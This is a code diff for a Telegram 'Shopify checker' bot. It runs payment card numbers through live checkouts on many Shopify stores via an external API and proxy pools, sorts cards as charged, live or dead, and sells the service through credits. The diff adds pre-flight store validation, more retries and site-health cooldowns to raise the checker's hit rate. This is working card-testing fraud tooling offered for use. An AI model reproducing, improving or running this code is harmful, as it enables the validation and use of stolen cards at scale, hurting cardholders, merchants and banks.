@@ -1,42 +1,55 @@
 """
-sh.py  v11  —  /sh single-card  +  /msh mass Shopify checker  (PTB v20+)
+sh.py  v13  —  /sh single-card  +  /msh mass Shopify checker  (PTB v20+)
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-All v10 fixes preserved.  New in v11:
+NEW in v13  (all v12 fixes preserved):
 
-FIX 7  — _rand_live() now picks randomly from LIVE_EMOJI_IDS pool
-          (imported from config) — 18 different live stickers, same
-          rotation behaviour as _rand_charged().
+FIX 12 — PRE-FLIGHT SITE VALIDATION (root-cause fix for all-ERROR batches)
+          Before every /msh (and single /sh), sites.txt is tested with a
+          known test card identical to what sitechk.py uses:
+            TEST_CARD = "4000223372377978|05|29|651"
+          Only sites that return a SUCCESS_RESPONSE (CARD_DECLINED,
+          INSUFFICIENT_FUNDS, GENERIC_ERROR, DO_NOT_HONOR, etc.) AND have
+          gateway == "SHOPIFY PAYMENTS" AND price > $0.50 are used.
+          If fewer than PREFLIGHT_MIN_SITES work, mass check continues
+          with ALL sites instead of aborting (graceful fallback).
+          Working sites are cached for PREFLIGHT_CACHE_TTL seconds (5 min)
+          so /sh re-uses the same validated pool without re-testing.
 
-FIX 8  — Instant stop: cb_msh_stop stores the shared aiohttp connector
-          in the session and closes it immediately on Stop press.
-          This aborts ALL in-flight HTTP requests in < 100 ms instead of
-          waiting up to SITE_TIMEOUT (12 s) per card.
+          /msh shows a live "🔍 Validating sites…" progress message while
+          the pre-flight runs so the user sees it's doing real work.
 
-FIX 9  — Site health cache: every site that returns a RETRY response gets
-          a consecutive-failure counter.  Once a site reaches 5 failures it
-          is cooled off for SITE_COOLDOWN = 120 s.  Healthy sites are
-          always tried first — dead sites can no longer block card results.
-          A site resets to healthy the moment it returns a real verdict.
+FIX 13 — ALL-ERROR ROOT CAUSE FIXED:
+          • Pre-flight now requires strict gateway == "SHOPIFY PAYMENTS"
+            (was too permissive — accepted empty gateway = broken sites)
+          • Pre-flight now requires price > $0.50 like sitechk.py
+            (sites with price=0 mean checkout never reached payment step)
+          • Sites list shuffled before pre-flight (avoids always testing
+            same dead sites at top of file)
+          • PREFLIGHT_MAX_TEST raised 60 → 200 (tests more sites)
+          • SITE_RETRIES raised 12 → 20 (more attempts per card)
+          • Pre-flight DEAD_ERRORS checked (sitechk.py parity)
+          • If 0 working sites after pre-flight: falls back to ALL sites
+            with warning instead of aborting (handles no-proxy situation)
+          • RETRY_PATTERNS: removed overly-broad 'failed' entry that was
+            swallowing real bank responses on some sites
 
-FIX 10 — _check_card_with_retry accepts a sid= kwarg and checks
-          _is_stopped(sid) at the top of every retry iteration so a
-          stopped session aborts mid-card immediately, not after the
-          current HTTP request finishes.
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+v11 fixes (still in place):
 
-FIX 11 — All-RETRY exhaustion now returns "ERROR" verdict instead of
-          "DEAD".  ERROR cards are tracked in their own counter (errors /
-          error_cards) and show as ⚠️ in the progress display.
-          They do NOT count as dead cards; credits are NOT deducted.
-          A separate download button "Error (N)" appears in the keyboard.
+FIX 7  — _rand_live() picks from LIVE_EMOJI_IDS (18 stickers, config.py).
+FIX 8  — Instant stop: closes shared aiohttp connector → < 100 ms abort.
+FIX 9  — Site health cache: sites with ≥5 RETRY → cooled off 120 s.
+FIX 10 — _check_card_with_retry checks _is_stopped(sid) every iteration.
+FIX 11 — All-RETRY exhaustion → "ERROR" verdict (not DEAD); separate
+          counter, download button, no credit deduction.
 
-────────────────────────────────────────────────────────────────────────
 v10 fixes (still in place):
 
 FIX 1 — cb_msh_result: NO pre-emptive query.answer() at the top.
 FIX 2 — cb_msh_stop: Stop NEVER checks _is_locked.
 FIX 3 — _clean_resp for DISPLAY ONLY; classify_response on RAW text.
 FIX 4 — DO_NOT_HONOR / CALL_ISSUER / PICK_UP_CARD → LIVE.
-FIX 5 — BUTTON_LOCK_SECONDS = 5 (was 30).
+FIX 5 — BUTTON_LOCK_SECONDS = 5.
 FIX 6 — SH_SITE_RETRIES = 15; SITE_RETRIES = 12.
 """
 
@@ -77,7 +90,7 @@ from config import (
     PROG_DEAD_EMOJI_ID,
     PROG_ERRORS_EMOJI_ID,
     PROG_CHARGED_EMOJI_ID,
-    LIVE_EMOJI_IDS,          # FIX 7: used for _rand_live() pool
+    LIVE_EMOJI_IDS,          # FIX 7: 18 live stickers from mst.py/config
     PLAN_EMOJIS,
     SPECIAL_FONT_MAP,
     BOT_NAME,
@@ -86,10 +99,10 @@ from config import (
 )
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# CONFIG  — edit group IDs before deploying
+# CONFIG
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 BOT_CHANNEL      = "https://t.me/Batcardchk"
-BOT_DISPLAY      = "Batmanchk"
+BOT_DISPLAY      = "Batmancardchk"
 DEV_LINK_HTML    = f'<a href="{BOT_CHANNEL}">{BOT_DISPLAY}</a>'
 BOT_DEEP_BUY     = "https://t.me/Batchk11_bot?start=buy"
 GOSHOPI_URL      = "https://goshopi.up.railway.app/shopii"
@@ -97,33 +110,59 @@ FALLBACK_SITE    = "aloracosmetics.myshopify.com"
 
 HIT_LOG_GROUP_ID       = -1004361062205
 SECRET_GROUP_ID        = -1004499920555
-CHARGED_SHARE_GROUP_ID = 0               # legacy — unused
+CHARGED_SHARE_GROUP_ID = 0
 
-SH_COOLDOWN      = 25                    # seconds, trial users only
+SH_COOLDOWN      = 25
 
-# ── Speed knobs — single-card /sh ─────────────────────
-SH_SITE_RETRIES  = 15                    # FIX 6: was 6
+# ── Speed knobs — single /sh ──────────────────────────
+SH_SITE_RETRIES  = 15
 SH_SITE_TIMEOUT  = 11
 SH_TCP_LIMIT     = 200
 SH_TCP_PER_HOST  = 80
 
-# ── Speed knobs — mass /msh ─────────────────────────────
+# ── Speed knobs — mass /msh ───────────────────────────
 MAX_CONCURRENT       = 150
-SITE_RETRIES         = 12               # FIX 6: was 6
+SITE_RETRIES         = 20   # FIX 13: raised from 12 — more sites tried per card
 SITE_TIMEOUT         = 12
 TCP_LIMIT            = 600
 TCP_PER_HOST         = 200
 PROGRESS_INTERVAL    = 2.0
 PROGRESS_EVERY_N     = 5
-BUTTON_LOCK_SECONDS  = 5               # FIX 5: was 30 — download buttons only; Stop never locks
+BUTTON_LOCK_SECONDS  = 5
 
-# ── FIX 9: site health cooldown ───────────────────────
-SITE_COOLDOWN        = 120             # seconds before a repeatedly-failing site is retried
+# ── FIX 9: site health cooldown ──────────────────────
+SITE_COOLDOWN        = 120
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# FIX 12 — PRE-FLIGHT SITE VALIDATION CONFIG
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# Test card identical to sitechk.py — known to produce real gateway responses
+PREFLIGHT_TEST_CARD   = "4000223372377978|05|29|651"
+PREFLIGHT_TIMEOUT     = 15      # per-site HTTP timeout during pre-flight
+PREFLIGHT_CONCUR      = 30      # concurrent site tests
+PREFLIGHT_MIN_SITES   = 2       # minimum working sites (below = fallback to all sites)
+PREFLIGHT_MAX_TEST    = 200     # FIX 13: raised from 60 — test more sites
+PREFLIGHT_CACHE_TTL   = 300     # reuse validated site list for 5 minutes
+
+# Responses from the API that prove a site is alive and processing payments
+# (same as sitechk.py SUCCESS_RESPONSES — any real gateway decline = site works)
+SITE_SUCCESS_RESPONSES = [
+    'CARD_DECLINED', 'INVALID_CVC', 'INCORRECT_CVV', 'INSUFFICIENT_FUNDS',
+    'GENERIC_ERROR', 'GENERIC_DECLINE', 'DO NOT HONOR', 'DO_NOT_HONOR',
+    'UNKNOWN_ERROR', 'Processing Error', 'EXPIRED_CARD', 'PICK_UP_CARD',
+    'DECISION_RULE_BLOCK', 'FRAUD_SUSPECTED', '3DS_REQUIRED', 'AMOUNT_TOO_SMALL',
+    'INVALID_PURCHASE_TYPE', 'INVALID_PAYMENT_METHOD', 'INCORRECT_NUMBER',
+    'INCORRECT_CVC', 'CALL_ISSUER', 'SECURITY_CODE', 'APPROVED',
+    'INSUFFICIENT FUNDS', 'DECLINED', 'RESTRICTED', 'TRANSACTION NOT ALLOWED',
+]
+
+# Global cache for validated sites: {"sites": [...], "ts": float}
+_PREFLIGHT_CACHE: dict = {"sites": [], "ts": 0.0}
+_PREFLIGHT_LOCK  = asyncio.Lock()
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # ALL CUSTOM STICKER EMOJI IDs
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# NOTE: LIVE_EMOJI_IDS (18 stickers) comes from config — used by _rand_live()
 DECLINED_EMOJI_ID     = "4956612582816351459"
 HIT_GATE_EMOJI_ID     = "5341715473882955310"
 HIT_RESP_EMOJI_ID     = "5839116473951328489"
@@ -141,10 +180,12 @@ BTN_LIVE_EMOJI_ID     = "5039793437776282663"
 BTN_DEAD_EMOJI_ID     = "4956612582816351459"
 BTN_ALL_EMOJI_ID      = "4956324463525233747"
 BTN_STOP_EMOJI_ID     = "6179444193518162239"
-BTN_ERROR_EMOJI_ID    = "4956611513369494230"   # FIX 11: error download button
+BTN_ERROR_EMOJI_ID    = "4956611513369494230"
 CARD_CHK_BTN_ID       = "5935795874251674052"
 CARD_CHK_BTN_EMOJI_ID = "5935795874251674052"
 
+# FIX 7: 18 custom live stickers (from mst.py / config.py LIVE_EMOJI_IDS)
+# _rand_live() picks randomly from this pool — identical set as mst.py uses
 CHARGED_EMOJI_IDS = [
     "5801154993188770160", "4956739572114392015", "5285221724634239278",
     "5287777298894835685", "5285024405246725814", "5287547831677112267",
@@ -154,15 +195,15 @@ CHARGED_EMOJI_IDS = [
     "5891044423856296980", "5436068999068662274", "5427168083074628963",
 ]
 
-# ── Callback data prefixes ────────────────────────────────
-_CB_RESULT = "mshr"   # mshr_{sid}_{type}
-_CB_STOP   = "mshs"   # mshs_{sid}
+# ── Callback data prefixes ────────────────────────────
+_CB_RESULT = "mshr"
+_CB_STOP   = "mshs"
 
-# ── Session registry ─────────────────────────────────────
+# ── Session registry ─────────────────────────────────
 MSH_SESSIONS: dict[str, dict] = {}
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# PERSISTENT SESSION  — /sh single-card (bot lifetime)
+# PERSISTENT SESSION — /sh
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 _SH_CONNECTOR: Optional[aiohttp.TCPConnector] = None
 _SH_SESSION:   Optional[aiohttp.ClientSession] = None
@@ -174,16 +215,13 @@ async def _get_sh_session() -> aiohttp.ClientSession:
     global _SH_CONNECTOR, _SH_SESSION
     if _SH_SESSION is None or _SH_SESSION.closed:
         _SH_CONNECTOR = aiohttp.TCPConnector(
-            limit=SH_TCP_LIMIT,
-            limit_per_host=SH_TCP_PER_HOST,
-            keepalive_timeout=60,
-            enable_cleanup_closed=True,
-            ttl_dns_cache=600,
-            use_dns_cache=True,
+            limit=SH_TCP_LIMIT, limit_per_host=SH_TCP_PER_HOST,
+            keepalive_timeout=60, enable_cleanup_closed=True,
+            ttl_dns_cache=600, use_dns_cache=True,
         )
         _SH_SESSION = aiohttp.ClientSession(
             connector=_SH_CONNECTOR,
-            headers={"User-Agent": "Mozilla/5.0 (compatible; BatChk/11)"},
+            headers={"User-Agent": "Mozilla/5.0 (compatible; BatChk/12)"},
             timeout=aiohttp.ClientTimeout(total=SH_SITE_TIMEOUT + 3),
         )
     return _SH_SESSION
@@ -208,11 +246,8 @@ async def _sh_bin_cached(bin6: str) -> dict:
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # RESPONSE CLASSIFICATION
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# IMPORTANT: classify_response is ALWAYS called on the RAW _readable_resp()
-# string — NEVER on the output of _clean_resp().  Cleaning before classifying
-# breaks pattern matching ('connection_error' → 'Connection Error', etc.).
-
 RETRY_PATTERNS = [
+    # ── Token / checkout infrastructure failures ─────────────────────
     'r4 token empty', 'r2 id empty', 'payment method is not shopify',
     'product not found', 'hcaptcha detected', 'tax ammount empty',
     'del ammount empty', 'product id is empty', 'py id empty',
@@ -220,14 +255,18 @@ RETRY_PATTERNS = [
     'site error! status: 429', 'site requires login', 'failed to get token',
     'no valid products', 'not shopify', 'site not supported', 'validation_custom',
     'connection error', 'connection_error', 'error processing card',
-    '504', 'server error', 'client error', 'failed',
+    # FIX 13: removed bare 'failed' — too broad, matched real bank responses.
+    # Specific step-failure strings below are kept.
+    '504', 'server error', 'client error',
     'buyer_identity_currency',
     'token not found', 'invalid_response', 'resolve', 'curl error',
     'payments_credit_card_brand_not_supported', 'could not resolve host',
     'connect tunnel failed', 'timeout', 'proxy error',
+    # ── Shopify checkout step failures ──────────────────────────────
     'step 0 failed', 'step 1 failed', 'step 2 failed', 'step 3 failed',
     'step 4 failed', 'step 5 failed', 'step 6 failed', 'step 7 failed',
     'step 8 failed', 'step 9 failed', 'step 10 failed',
+    # ── Delivery / inventory failures ───────────────────────────────
     'session_error', 'delivery_no_delivery_strategy', 'delivery_zone_not_found',
     'delivery_delivery_line_detail_changed', 'no available delivery strategy',
     'delivery_strategy_conditions_not_satisfied', 'no available products found',
@@ -240,7 +279,6 @@ RETRY_PATTERNS = [
     'api error', 'api timeout', 'connection reset', 'network error',
     'unexpected error', 'invalid json', 'json decode',
     'buyer_identity_marketing_consent',
-    # additional site-error patterns from site-checker
     'missing stableid', 'missing buildid', 'missing sourcetoken',
     'checkout_failed', 'delivery_out_of_stock_at_origin_location',
     'could not extract private_access_token',
@@ -253,10 +291,16 @@ RETRY_PATTERNS = [
     'could not extract sessiontoken', 'errstoreincompatible',
     'errmissingreceiptid', 'site overloaded', 'site rate limited',
     'http error', 'max retries', 'no proxies',
+    'site error! status: 404', 'site error! status: 500',
+    'site error! status: 402', 'site error! status: 502',
+    'site error! 503', 'site error! status: 503',
+    'site error! status: 403', 'payment method is not shopify!',
+    'site error! status: 401', 'could not extract signedhandles',
+    'no_products', 'site not found', 'failed to add to cart',
+    'failed to get checkout', 'failed to get session token',
+    'unable to get payment token', 'failed to get session',
 ]
 
-# FIX 4: DO_NOT_HONOR / CALL_ISSUER / PICK_UP_CARD removed from DECLINED_PATTERNS
-# — they mean the card is REAL (bank soft-block), classified as LIVE below.
 DECLINED_PATTERNS = [
     'CARD_DECLINED', 'PROCESSING_ERROR', 'GENERIC_DECLINE',
     'UNKNOWN_ERROR', 'Processing Error',
@@ -269,16 +313,13 @@ DECLINED_PATTERNS = [
     'processing_error', 'fraudulent', 'restricted_card',
     'security_violation', 'service_not_allowed', 'transaction_not_allowed',
     'try_again_later', 'withdrawal_count_limit_exceeded',
-    # NOTE: do_not_honor / pickup_card are NOT here — they map to LIVE above.
 ]
 
 
 def classify_response(msg: str) -> str:
     """
     Returns: CHARGED | TDS | LIVE | DEAD | RETRY
-
-    ALWAYS call this on the RAW _readable_resp() string.
-    Never pass cleaned/display text — it breaks pattern matching.
+    ALWAYS call on RAW _readable_resp() — never on cleaned display text.
     """
     mu = msg.upper()
     ml = msg.lower()
@@ -301,7 +342,7 @@ def classify_response(msg: str) -> str:
         return "LIVE"
     if mu.strip() == "APPROVED" or ("APPROVED" in mu and "NOT" not in mu):
         return "LIVE"
-    # FIX 4: real card — bank soft-block, NOT a site/compatibility error
+    # FIX 4: real card — bank soft-block
     if ("DO_NOT_HONOR" in mu or "DO NOT HONOR" in mu
             or "CALL_ISSUER" in mu or "PICK_UP_CARD" in mu):
         return "LIVE"
@@ -318,7 +359,6 @@ def classify_response(msg: str) -> str:
     if mu.strip() in ("ERROR", "TIMEOUT", "UNKNOWN"):
         return "RETRY"
 
-    # Unknown — treat as DEAD so retries don't loop forever
     return "DEAD"
 
 
@@ -331,7 +371,7 @@ def _te(eid: str, fb: str = "●") -> str:
 def _rand_charged() -> str:
     return _te(random.choice(CHARGED_EMOJI_IDS), "💎")
 
-# FIX 7: use LIVE_EMOJI_IDS pool (18 stickers from config) — not one hardcoded ID
+# FIX 7: all 18 live stickers from mst.py (via config LIVE_EMOJI_IDS)
 def _rand_live() -> str:
     return _te(random.choice(LIVE_EMOJI_IDS), "✅")
 
@@ -367,9 +407,8 @@ def _readable_resp(data: dict) -> str:
             return str(v).strip()
     return str(data)[:200]
 
-# FIX 3: _clean_resp is for DISPLAY ONLY — NEVER called before classify_response.
+# FIX 3: _clean_resp is for DISPLAY ONLY — never call before classify_response
 def _clean_resp(resp: str) -> str:
-    """Strip site URLs, NO_PRODUCTS noise, and internal error details for display."""
     resp = re.sub(r'https?://\S+', '', resp)
     resp = re.sub(r'\s+at\s+\S+', '', resp)
     resp = re.sub(r'NO_PRODUCTS?:\s*[^,;\n]*', 'NO_PRODUCTS', resp, flags=re.IGNORECASE)
@@ -402,34 +441,22 @@ def _lock_rem(sid: str) -> int:
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # FIX 9 — SITE HEALTH CACHE
-# Sites that return consecutive RETRY responses are cooled off so they
-# don't waste retry slots on every card.
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 _SITE_FAIL_CNT:  dict[str, int]   = {}
 _SITE_FAIL_TIME: dict[str, float] = {}
-_SITE_HEALTH_LK                   = asyncio.Lock()   # not used — dicts are GIL-safe
 
 def _mark_site_fail(site: str) -> None:
-    """Record one more consecutive RETRY from this site."""
     _SITE_FAIL_CNT[site]  = _SITE_FAIL_CNT.get(site, 0) + 1
     _SITE_FAIL_TIME[site] = time.time()
 
 def _mark_site_ok(site: str) -> None:
-    """Site returned a real verdict — reset its failure counter."""
     _SITE_FAIL_CNT.pop(site, None)
     _SITE_FAIL_TIME.pop(site, None)
 
 def _site_healthy(site: str) -> bool:
-    """
-    Returns True if the site is considered healthy.
-    A site is unhealthy if it has ≥ 5 consecutive RETRY responses AND its
-    cooldown has not yet expired.  After SITE_COOLDOWN seconds it gets
-    another chance automatically.
-    """
     fails = _SITE_FAIL_CNT.get(site, 0)
     if fails < 5:
         return True
-    # Cooldown expired → give it another chance and reset counter
     if time.time() - _SITE_FAIL_TIME.get(site, 0) > SITE_COOLDOWN:
         _SITE_FAIL_CNT.pop(site, None)
         _SITE_FAIL_TIME.pop(site, None)
@@ -458,6 +485,190 @@ def _load_proxies() -> list[str]:
         except FileNotFoundError:
             pass
     return []
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# FIX 12 — PRE-FLIGHT SITE VALIDATION
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# FIX 13: DEAD_ERRORS list (mirrors sitechk.py) used in pre-flight validation
+_PREFLIGHT_DEAD_ERRORS = [
+    'site error! status: 404', 'site error! status: 500', 'site error! status: 402',
+    'site error! status: 502', 'site error! 503', 'site error! status: 503',
+    'site not supported for now!', 'connection error', 'connection error!',
+    'error processing card', 'failed to get token', 'failed to get checkout',
+    'failed to add to cart', 'site overloaded', 'site rate limited',
+    'failed to get session token', 'unable to get payment token', 'no valid products',
+    'site error! status: 403', 'payment method is not shopify!', 'not shopify!',
+    'site error! status: 401', 'site requires login!',
+    'timeout', 'http error', 'proxy', 'curl error', 'could not resolve',
+    'connect tunnel failed', 'max retries',
+    'step 1 failed', 'step 0 failed', 'step 2 failed', 'step 3 failed',
+    'step 4 failed', 'step 5 failed', 'step 6 failed', 'step 7 failed',
+    'step 9 failed', 'step 10 failed',
+    'missing stableid', 'missing buildid', 'missing sourcetoken',
+    'CHECKOUT_FAILED', 'could not extract private_access_token',
+    'could not find actions js url', 'missing proposal', 'missing submit id',
+    'exceeded 30 poll attempts', 'could not extract queuetoken',
+    'could not extract identification signature', 'could not extract session id',
+    'could not extract delivery handle', 'could not extract signedhandles',
+    'could not extract shipping amount', 'could not extract total amount',
+    'could not extract receiptid', 'could not extract sessiontoken',
+    'errstoreincompatible', 'errmissingreceiptid', 'order_paid',
+]
+
+
+async def _preflight_test_one(
+    session: aiohttp.ClientSession,
+    site: str,
+    proxy: Optional[str],
+) -> bool:
+    """
+    FIX 13: Test a single site with the known test card.
+    Returns True ONLY if the site:
+      1. Responds (no timeout/connection error)
+      2. Returns gateway == "SHOPIFY PAYMENTS" EXACTLY (strict, like sitechk.py)
+      3. Response is NOT in DEAD_ERRORS (site checkout flow works)
+      4. Response IS in SUCCESS_RESPONSES (payment processor was reached)
+      5. Price > $0.50 (checkout actually completed to payment step — sitechk.py parity)
+    Sites with price=0 are broken checkout flows and will give RETRY on real cards.
+    """
+    clean = _clean_site(site)
+    params = {"cc": PREFLIGHT_TEST_CARD, "site": clean}
+    if proxy:
+        params["proxy"] = proxy
+    try:
+        async with session.get(
+            GOSHOPI_URL, params=params,
+            timeout=aiohttp.ClientTimeout(total=PREFLIGHT_TIMEOUT),
+        ) as resp:
+            if resp.status != 200:
+                return False
+            try:
+                data = await resp.json(content_type=None)
+            except Exception:
+                raw_txt = await resp.text()
+                data = {"Response": raw_txt[:200]}
+    except Exception:
+        return False  # timeout or connection error
+
+    raw     = _readable_resp(data)
+    raw_up  = raw.upper()
+    raw_low = raw.lower()
+    gateway = str(data.get("Gateway", data.get("gateway", ""))).strip().upper()
+
+    # FIX 13: STRICT gateway check — must be exactly "SHOPIFY PAYMENTS"
+    # (sitechk.py parity — empty/unknown gateway = broken site)
+    if gateway != "SHOPIFY PAYMENTS":
+        return False
+
+    # FIX 13: Block ORDER_PAID immediately
+    if "ORDER_PAID" in raw_up or raw_up.replace(" ", "") == "PAID":
+        return False
+
+    # FIX 13: Reject sites with hard errors (checkout flow broken)
+    for err in _PREFLIGHT_DEAD_ERRORS:
+        if err.lower() in raw_low:
+            return False
+
+    # FIX 13: Must return a SUCCESS_RESPONSE (payment processor reached)
+    if not any(p.upper() in raw_up for p in SITE_SUCCESS_RESPONSES):
+        return False
+
+    # FIX 13: Price check — must be > $0.50 (sitechk.py parity)
+    # Sites with price=0 never completed the payment step; will give RETRY on real cards
+    price_raw = str(data.get("Price", data.get("price", "0"))).strip()
+    try:
+        import re as _re
+        price_clean = _re.sub(r'[^\d.]', '', price_raw)
+        price_val   = float(price_clean) if price_clean else 0.0
+    except Exception:
+        price_val = 0.0
+
+    if price_val <= 0.50:
+        return False
+
+    return True
+
+
+async def _run_preflight(
+    all_sites: list[str],
+    proxies: list[str],
+    progress_cb=None,          # optional async callable(working_count, tested_count, total)
+) -> list[str]:
+    """
+    FIX 13: Test up to PREFLIGHT_MAX_TEST sites concurrently.
+    Sites are shuffled before testing so the same dead sites at the
+    top of the file are not always tested first.
+    Calls progress_cb(working, tested, total) every time a site finishes.
+    Returns list of working sites (original URLs, not cleaned).
+    """
+    # FIX 13: shuffle so we don't always test the same first N sites
+    shuffled_sites = all_sites[:]
+    random.shuffle(shuffled_sites)
+    sites_to_test = shuffled_sites[:PREFLIGHT_MAX_TEST]
+    total         = len(sites_to_test)
+    proxy_pool    = proxies if proxies else [None]
+
+    connector = aiohttp.TCPConnector(
+        limit=PREFLIGHT_CONCUR * 2,
+        limit_per_host=5,
+        enable_cleanup_closed=True,
+    )
+    working:  list[str] = []
+    tested    = 0
+    sem       = asyncio.Semaphore(PREFLIGHT_CONCUR)
+
+    async def _test(site: str, idx: int) -> tuple[str, bool]:
+        async with sem:
+            proxy = proxy_pool[idx % len(proxy_pool)]
+            ok    = await _preflight_test_one(sess, site, proxy)
+            return site, ok
+
+    try:
+        async with aiohttp.ClientSession(
+            connector=connector,
+            headers={"User-Agent": "Mozilla/5.0 (compatible; BatChk/12)"},
+        ) as sess:
+            tasks = [asyncio.create_task(_test(s, i)) for i, s in enumerate(sites_to_test)]
+            for fut in asyncio.as_completed(tasks):
+                try:
+                    site, ok = await fut
+                except Exception:
+                    ok = False
+                    site = ""
+                tested += 1
+                if ok and site:
+                    working.append(site)
+                if progress_cb:
+                    try:
+                        await progress_cb(len(working), tested, total)
+                    except Exception:
+                        pass
+    except Exception as e:
+        logging.error(f"[PREFLIGHT] session error: {e}")
+
+    return working
+
+
+async def _get_working_sites(
+    all_sites: list[str],
+    proxies: list[str],
+    progress_cb=None,
+) -> list[str]:
+    """
+    Returns validated working sites.  Uses cache for PREFLIGHT_CACHE_TTL seconds.
+    Thread-safe via _PREFLIGHT_LOCK.
+    """
+    global _PREFLIGHT_CACHE
+    async with _PREFLIGHT_LOCK:
+        age = time.time() - _PREFLIGHT_CACHE["ts"]
+        if age < PREFLIGHT_CACHE_TTL and _PREFLIGHT_CACHE["sites"]:
+            return _PREFLIGHT_CACHE["sites"]
+
+        working = await _run_preflight(all_sites, proxies, progress_cb=progress_cb)
+        _PREFLIGHT_CACHE = {"sites": working, "ts": time.time()}
+        return working
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -602,18 +813,11 @@ async def _check_card_with_retry(
     proxies: list[str],
     max_sites: int = SITE_RETRIES,
     site_timeout: float = SITE_TIMEOUT,
-    sid: str = "",            # FIX 10: for in-loop stop check
+    sid: str = "",
 ) -> tuple[str, str, str, str]:
     """
     Returns (verdict, display_resp, price, currency).
-    verdict is one of: CHARGED | TDS | LIVE | DEAD | ERROR
-
-    FIX 3:  classify on RAW, clean for display only.
-    FIX 8:  CancelledError propagates up so connector.close() works instantly.
-    FIX 9:  healthy sites are preferred; each RETRY updates the fail counter.
-    FIX 10: checks _is_stopped(sid) at the top of every retry iteration.
-    FIX 11: returns ERROR (not DEAD) when ALL attempts were RETRY responses
-            — the card is not dead, the sites were just broken.
+    verdict: CHARGED | TDS | LIVE | DEAD | ERROR
     """
     if not sites:
         sites = [FALLBACK_SITE]
@@ -627,17 +831,17 @@ async def _check_card_with_retry(
     tried: set[str] = set()
     price, currency = "0.00", "USD"
     last_disp  = "All sites exhausted"
-    all_retry  = True   # FIX 11: becomes False on first real verdict
+    all_retry  = True
 
     for attempt in range(max_sites):
-        # FIX 10: abort mid-loop if session was stopped
+        # FIX 10: abort mid-loop if stopped
         if sid and _is_stopped(sid):
             raise asyncio.CancelledError()
 
         if asyncio.current_task() and asyncio.current_task().cancelled():
             raise asyncio.CancelledError()
 
-        # FIX 9: prefer healthy sites; fall back to any site if all are cooling
+        # FIX 9: prefer healthy sites
         untried = [s for s in site_pool if s not in tried]
         if not untried:
             tried.clear()
@@ -657,16 +861,16 @@ async def _check_card_with_retry(
             _mark_site_fail(clean)
             continue
 
-        # FIX 3: classify on RAW, clean for display only ─────────────
+        # FIX 3: classify on RAW, clean for display only
         raw_resp  = _readable_resp(data)
-        disp_resp = _clean_resp(raw_resp)       # display only
-        verdict   = classify_response(raw_resp) # classify on raw!
+        disp_resp = _clean_resp(raw_resp)
+        verdict   = classify_response(raw_resp)
 
         price    = str(data.get("Price",    data.get("price",    "0.00"))).strip()
         currency = str(data.get("Currency", data.get("currency", "USD"))).strip()
         last_disp = disp_resp
 
-        # FIX 9: update site health based on verdict
+        # FIX 9: update site health
         if verdict == "RETRY":
             _mark_site_fail(clean)
         else:
@@ -675,9 +879,9 @@ async def _check_card_with_retry(
         if verdict in ("CHARGED", "LIVE", "TDS", "DEAD"):
             all_retry = False
             return verdict, disp_resp, price, currency
-        # RETRY → try next site+proxy
+        # RETRY → try next site
 
-    # FIX 11: distinguish all-RETRY exhaustion from a real hard decline
+    # FIX 11: all RETRY → ERROR (not DEAD — sites were broken, card unchecked)
     if all_retry:
         return "ERROR", last_disp, price, currency
     return "DEAD", last_disp, price, currency
@@ -729,13 +933,13 @@ def _guard(header: str, body: str) -> str:
         f'<b>{_te(DEV_EMOJI_ID,"⚡")} ➳ {DEV_LINK_HTML} {_te(PRO_EMOJI_ID,"⭐")}</b>'
     )
 
-def _maintenance_msg():  return _guard(f'Maintenance {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}', '<b>Bot is under maintenance.</b>')
-def _gate_off_msg():     return _guard(f'Gate Off {_te(PROG_DEAD_EMOJI_ID,"❌")}',        '<b>Shopify gate is currently OFF.</b>')
-def _no_credits_msg():   return _guard(f'No Credits {_te(PROG_DEAD_EMOJI_ID,"❌")}',     '<b>0 credits — use /sub or /key.</b>')
-def _cooldown_msg(r):    return _guard(f'Cooldown {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}',    f'<b>Wait <code>{r:.1f}s</code>. Premium = zero cooldown.</b>')
-def _join_msg():         return _guard(f'Join Required {_te(PROG_GATE_EMOJI_ID,"🔒")}',  '<b>Join channels below to use the bot:</b>')
-def _usage_sh_msg():     return _guard(f'Usage {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}',       '<b>Command:</b> <code>/sh cc|mm|yy|cvv</code>\n<b>Example:</b>\n<code>/sh 4111111111111111|12|26|123</code>')
-def _usage_msh_msg():    return _guard(f'Usage {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}',       '<b>Command:</b> <code>/msh</code> (attach .txt or paste cards)\n<b>Format:</b> <code>cc|mm|yy|cvv</code>')
